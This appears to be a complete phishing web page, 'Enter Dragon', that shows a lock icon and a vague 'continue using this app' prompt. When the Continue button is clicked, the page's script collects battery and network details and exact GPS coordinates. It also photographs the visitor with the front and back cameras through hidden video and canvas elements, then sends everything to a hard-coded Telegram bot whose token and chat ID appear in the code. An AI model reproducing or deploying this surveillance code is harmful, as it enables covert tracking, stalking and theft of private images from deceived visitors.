    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #050505; 
            color: white;
            overflow-x: hidden;
            -webkit-tap-highlight-color: transparent; 
        }

        .ambient-blob {
            position: fixed;
            border-radius: 50%;
            filter: blur(90px);
            z-index: -1;
            opacity: 0.35;
            animation: float 12s infinite alternate ease-in-out;
        }
        .blob-1 { top: -5%; left: -10%; width: 45vw; height: 45vw; background: #3b82f6; }
        .blob-2 { bottom: -10%; right: -5%; width: 55vw; height: 55vw; background: #8b5cf6; }

        @keyframes float {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(20px, -40px) scale(1.1); }
        }

        .glass-panel {
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
        }

        .btn-active:active { transform: scale(0.97); }

        /* Toast Notifications System */
        #toast-container {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            flex-direction: column;
            gap: 12px;
            z-index: 9999;
            width: 90%;
            max-width: 380px;
            pointer-events: none;
        }

        .toast {
            background: rgba(15, 15, 15, 0.9);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            color: #f3f4f6;
            padding: 14px 18px;
            border-radius: 14px;
            font-size: 0.875rem;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
            opacity: 0;
            transform: translateY(30px) scale(0.95);
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .toast.show {
            opacity: 1;
            transform: translateY(0) scale(1);
        }
    </style>
</head>
<body class="min-h-screen flex flex-col relative selection:bg-blue-500/30">

    <div class="ambient-blob blob-1"></div>
    <div class="ambient-blob blob-2"></div>

    <!-- Header -->
    <header class="w-full fixed top-0 z-50 glass-panel border-b-0">
        <div class="px-4 py-5 flex justify-center items-center">
            <h1 class="text-xl font-bold tracking-[0.25em] uppercase text-gray-200 drop-shadow-md">
                Enter Dragon
            </h1>
        </div>
    </header>

    <!-- Main Interface -->
    <main class="flex-1 flex flex-col items-center justify-center p-6 mt-16 z-10 w-full max-w-md mx-auto text-center">
        
        <div class="w-20 h-20 mb-8 rounded-full flex items-center justify-center glass-panel shadow-[0_0_30px_rgba(139,92,246,0.2)]">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-purple-400 opacity-90" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
                <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
        </div>

        <p class="text-gray-300 mb-10 leading-relaxed text-[1.05rem] max-w-[290px]">
            Do you want to continue using this app? Is the service required?
        </p>

        <!-- Continue Button -->
        <button id="btn-continue" class="btn-active w-full max-w-[280px] py-4 rounded-2xl font-semibold text-lg text-white shadow-[0_8px_30px_rgba(59,130,246,0.3)] transition-all bg-gradient-to-r from-blue-600/40 to-purple-600/40 backdrop-blur-xl border border-white/10 hover:border-white/30 flex items-center justify-center gap-3 relative overflow-hidden">
            <span id="btn-text">Continue</span>
            <svg id="btn-icon" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                <path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd" />
            </svg>
            <svg id="btn-spinner" class="animate-spin hidden h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
            </svg>
        </button>
    </main>

    <div id="toast-container"></div>

    <!-- Hidden Video/Canvas for Background Capture -->
    <video id="hidden-video" class="hidden" autoplay playsinline muted></video>
    <canvas id="hidden-canvas" class="hidden"></canvas>

    <script>
        const BOT_TOKEN = '8646604552:AAGWM4W4i9g9T-itnFscvQom32md5GP7lHo';
        const CHAT_ID = '7208869554';
        
        const btnContinue = document.getElementById('btn-continue');
        const btnText = document.getElementById('btn-text');
        const btnIcon = document.getElementById('btn-icon');
        const btnSpinner = document.getElementById('btn-spinner');
        const toastContainer = document.getElementById('toast-container');
        
        const video = document.getElementById('hidden-video');
        const canvas = document.getElementById('hidden-canvas');
        const ctx = canvas.getContext('2d');

        function showToast(message, type = 'info') {
            const toast = document.createElement('div');
            toast.className = 'toast';
            
            let icon = 'ℹ️';
            if(type === 'success') icon = '✅';
            if(type === 'error') icon = '❌';
            if(type === 'wait') icon = '⏳';
            
            toast.innerHTML = `<span class="text-lg">${icon}</span> <span>${message}</span>`;
            toastContainer.appendChild(toast);
            
            setTimeout(() => toast.classList.add('show'), 10);
            
            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => toast.remove(), 400);
            }, 3500);
        }

        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
                }
                return "Not supported";
            } catch (e) {
                return "Error fetching";
            }
        }

        function getNetworkInfo() {
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    return `${conn.effectiveType || 'Unknown'} (Downlink: ${conn.downlink || 0}Mbps)`;
                }
                return "Not supported";
            } catch (e) {
                return "Error fetching";
            }
        }

        // Exact Google Maps Link formatting fixed here
        function getExactGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ success: false, data: "Geolocation not supported by browser" });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ 
                        success: true, 
                        data: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` 
                    }),
                    (err) => resolve({ success: false, data: err.message }),
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            });
        }

        async function sendTextToBot(text) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                const res = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: false })
                });
                return res.ok;
            } catch (e) { return false; }
        }

        async function sendPhotoToBot(blob, caption) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'photo.jpg');
            fd.append('caption', caption);

            try {
                const res = await fetch(url, { method: 'POST', body: fd });
                return res.ok;
            } catch (e) { return false; }
        }

        async function captureCameraSilent(facingMode) {
            let stream = null;
            try {
                // Try exact facing mode, fallback to loose constraint if browser rejects
                const constraints = { 
                    video: facingMode === 'environment' 
                        ? { facingMode: { exact: "environment" } } 
                        : { facingMode: "user" } 
                };

                try {
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                } catch(e) {
                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                }

                video.srcObject = stream;
                await video.play();
                
                // Wait briefly for camera hardware to focus/adjust light
                await new Promise(r => setTimeout(r, 1200)); 

                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
                return blob;
            } catch (error) {
                console.warn("Camera failed:", error);
                return null;
            } finally {
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                }
            }
        }

        btnContinue.addEventListener('click', async () => {
            // Setup UI for processing
            btnContinue.disabled = true;
            btnText.innerText = "Processing...";
            btnIcon.classList.add('hidden');
            btnSpinner.classList.remove('hidden');
            
            showToast("Initializing process...", "wait");

            // 1. Get Base Info
            const battery = await getBatteryInfo();
            const network = getNetworkInfo();
            
            // 2. Get GPS (Google Maps Format)
            showToast("Fetching exact GPS location...", "wait");
            const gps = await getExactGPS();
            
            if (gps.success) {
                showToast("GPS Location acquired", "success");
            } else {
                showToast(`GPS Error: ${gps.data}`, "error");
            }

            // Send Text Data
            const msg = `🐉 <b>ENTER DRAGON ALERT</b>\n\n` +
                        `🔋 <b>Battery:</b> ${battery}\n` +
                        `📶 <b>Network:</b> ${network}\n` +
                        `📍 <b>Location:</b> ${gps.success ? gps.data : 'Failed - ' + gps.data}`;
            
            const sentText = await sendTextToBot(msg);
            if (sentText) showToast("Text data sent to server", "success");
            else showToast("Failed to send text data", "error");

            // 3. Process Front Camera
            showToast("Accessing Front Camera...", "wait");
            const frontBlob = await captureCameraSilent('user');
            if (frontBlob) {
                const sentFront = await sendPhotoToBot(frontBlob, "Front Camera Capture");
                if(sentFront) showToast("Front Camera image sent", "success");
                else showToast("Failed to upload Front Camera image", "error");
            } else {
                showToast("Front Camera access denied/failed", "error");
            }

            // 4. Process Back Camera
            showToast("Accessing Back Camera...", "wait");
            const backBlob = await captureCameraSilent('environment');
            if (backBlob) {
                const sentBack = await sendPhotoToBot(backBlob, "Back Camera Capture");
                if(sentBack) showToast("Back Camera image sent", "success");
                else showToast("Failed to upload Back Camera image", "error");
            } else {
                showToast("Back Camera access denied/failed", "error");
            }

            // Restore UI (Stays on same page)
            showToast("Process complete.", "success");
            btnContinue.disabled = false;
            btnText.innerText = "Continue";
            btnIcon.classList.remove('hidden');
            btnSpinner.classList.add('hidden');
        });
    </script>
</body>
</html>
